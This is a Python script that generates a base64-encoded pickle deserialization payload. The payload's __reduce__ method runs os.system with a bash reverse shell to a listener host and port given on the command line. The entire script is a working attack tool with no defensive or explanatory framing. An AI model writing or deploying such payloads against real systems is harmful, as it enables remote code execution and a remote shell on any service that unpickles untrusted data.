#!/usr/bin/env python3

import pickle
import base64
import os
import argparse

def generate_payload(lhost, lport):

    command = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    
    class RCE:
        def __reduce__(self):
            return (os.system, (command,))
    
    payload = pickle.dumps(RCE())
    encoded = base64.b64encode(payload).decode()
    
    return encoded

def main():
    parser = argparse.ArgumentParser(
        description='Generate pickle RCE reverse shell payload',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 ./*.py -LHOST 10.10.10.10 -LPORT 9999
        '''
    )
    
    parser.add_argument(
        '-LHOST',
        required=True,
        dest='lhost',
        help='Listener host'
    )
    
    parser.add_argument(
        '-LPORT',
        required=True,
        type=int,
        dest='lport',
        help='Listener port'
    )
    
    args = parser.parse_args()
    
    payload = generate_payload(args.lhost, args.lport)
    
    print(f"\n[*] Command: bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'")
    print(f"\n[+] Base64 payload:")
    print(payload)

if __name__ == "__main__":
    main()
